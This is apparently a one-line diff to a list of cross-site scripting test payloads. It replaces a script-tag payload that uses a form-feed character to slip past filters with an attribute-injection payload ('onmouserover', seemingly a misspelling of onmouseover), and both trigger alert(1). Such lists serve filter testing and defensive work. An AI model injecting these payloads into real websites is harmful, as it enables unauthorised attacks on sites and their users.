@@ -1,1 +1,1 @@
-<script\x0Ctype="text/javascript">javascript:alert(1);</script>
+1'onmouserover='javascript:alert(1)
